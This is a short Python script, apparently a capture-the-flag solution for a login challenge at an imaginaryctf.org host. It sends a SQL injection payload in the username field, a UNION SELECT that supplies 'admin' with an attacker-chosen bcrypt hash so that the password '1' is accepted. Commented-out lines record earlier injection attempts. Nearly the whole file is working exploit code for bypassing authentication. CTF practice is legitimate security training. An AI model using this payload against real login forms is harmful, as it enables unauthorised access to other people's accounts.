import requests

url = "http://login.chal.imaginaryctf.org/"
data = {
    # "username": "admin",
    # "password": ""
    "username": "adminasdasdasd' union select 'admin', '$2b$12$zlMgDAKYPqxA787D83eYeeBy5pb06naORsaDNWsjPTisdTYSI1Tqm' -- -",
    "password": "1"
    # "username": "'#",
    # "password": ""
}
params = {"688a35c685a7a654abc80f8e123ad9f0": "123"}

res = requests.post(url=url, data=data, params=params)
print(res.text)